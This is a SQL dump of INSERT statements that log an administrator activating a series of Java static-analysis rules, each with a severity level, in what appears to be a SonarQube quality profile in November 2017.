INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2202, '2017-11-20 11:14:43.309', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzHtbbGRdfPp-q_-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2203, '2017-11-20 11:14:43.386', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzI6bbGRdfPp-q__');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2204, '2017-11-20 11:14:43.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzJhbbGRdfPp-rAA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2205, '2017-11-20 11:14:43.459', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzKDbbGRdfPp-rAB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2206, '2017-11-20 11:14:43.483', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzKbbbGRdfPp-rAC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2207, '2017-11-20 11:14:43.51', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzK2bbGRdfPp-rAD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2208, '2017-11-20 11:14:43.526', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzLGbbGRdfPp-rAE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2209, '2017-11-20 11:14:43.549', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzLdbbGRdfPp-rAF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2210, '2017-11-20 11:14:43.57', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzLybbGRdfPp-rAG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2211, '2017-11-20 11:14:43.596', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzMMbbGRdfPp-rAH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2212, '2017-11-20 11:14:43.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzMhbbGRdfPp-rAI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2213, '2017-11-20 11:14:43.642', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzM6bbGRdfPp-rAJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2214, '2017-11-20 11:14:43.671', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzNXbbGRdfPp-rAK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2215, '2017-11-20 11:14:43.698', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzNybbGRdfPp-rAL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2216, '2017-11-20 11:14:43.725', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzONbbGRdfPp-rAM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2217, '2017-11-20 11:14:43.756', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzOsbbGRdfPp-rAN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2218, '2017-11-20 11:14:43.785', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzPIbbGRdfPp-rAO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2219, '2017-11-20 11:14:43.812', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzPkbbGRdfPp-rAP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2220, '2017-11-20 11:14:43.839', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzP_bbGRdfPp-rAQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2221, '2017-11-20 11:14:43.875', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzQjbbGRdfPp-rAR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2222, '2017-11-20 11:14:43.906', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzRCbbGRdfPp-rAS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2223, '2017-11-20 11:14:43.933', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzRdbbGRdfPp-rAT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2224, '2017-11-20 11:14:43.952', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzRwbbGRdfPp-rAU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2225, '2017-11-20 11:14:43.969', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzSBbbGRdfPp-rAV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2226, '2017-11-20 11:14:43.998', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzSebbGRdfPp-rAW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2227, '2017-11-20 11:14:44.015', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzSvbbGRdfPp-rAX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2228, '2017-11-20 11:14:44.045', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzTNbbGRdfPp-rAY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2229, '2017-11-20 11:14:44.111', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzUPbbGRdfPp-rAZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2230, '2017-11-20 11:14:44.155', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzU7bbGRdfPp-rAa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2231, '2017-11-20 11:14:44.212', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzV0bbGRdfPp-rAb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2232, '2017-11-20 11:14:44.29', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzXCbbGRdfPp-rAc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2233, '2017-11-20 11:14:44.313', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzXZbbGRdfPp-rAd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2234, '2017-11-20 11:14:44.334', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzXubbGRdfPp-rAe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2235, '2017-11-20 11:14:44.375', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzYXbbGRdfPp-rAf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2236, '2017-11-20 11:14:44.412', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzY8bbGRdfPp-rAg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2237, '2017-11-20 11:14:44.436', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzZUbbGRdfPp-rAh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2238, '2017-11-20 11:14:44.484', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzaEbbGRdfPp-rAi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2239, '2017-11-20 11:14:44.54', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIza8bbGRdfPp-rAj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2240, '2017-11-20 11:14:44.569', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzbZbbGRdfPp-rAk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2241, '2017-11-20 11:14:44.584', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzbobbGRdfPp-rAl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2242, '2017-11-20 11:14:44.609', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzcBbbGRdfPp-rAm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2243, '2017-11-20 11:14:44.623', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzcPbbGRdfPp-rAn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2244, '2017-11-20 11:14:44.662', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzc2bbGRdfPp-rAo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2245, '2017-11-20 11:14:44.681', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzdJbbGRdfPp-rAp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2246, '2017-11-20 11:14:44.697', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzdZbbGRdfPp-rAq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2247, '2017-11-20 11:14:44.721', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzdxbbGRdfPp-rAr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2248, '2017-11-20 11:14:44.744', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzeIbbGRdfPp-rAs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2249, '2017-11-20 11:14:44.769', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzehbbGRdfPp-rAt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2250, '2017-11-20 11:14:44.781', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzetbbGRdfPp-rAu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2251, '2017-11-20 11:14:44.793', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIze5bbGRdfPp-rAv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2252, '2017-11-20 11:14:44.817', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzfRbbGRdfPp-rAw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2253, '2017-11-20 11:14:44.832', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzfgbbGRdfPp-rAx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2254, '2017-11-20 11:14:44.873', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzgJbbGRdfPp-rAy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2255, '2017-11-20 11:14:44.898', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzgibbGRdfPp-rAz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2256, '2017-11-20 11:14:44.924', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzg8bbGRdfPp-rA0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2257, '2017-11-20 11:14:44.943', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzhPbbGRdfPp-rA1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2258, '2017-11-20 11:14:44.97', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzhqbbGRdfPp-rA2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2259, '2017-11-20 11:14:44.994', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIziCbbGRdfPp-rA3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2260, '2017-11-20 11:14:45.086', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzjebbGRdfPp-rA4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2261, '2017-11-20 11:14:45.162', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzkqbbGRdfPp-rA5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2262, '2017-11-20 11:14:45.293', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzmtbbGRdfPp-rA6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2263, '2017-11-20 11:14:45.369', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzn5bbGRdfPp-rA7');
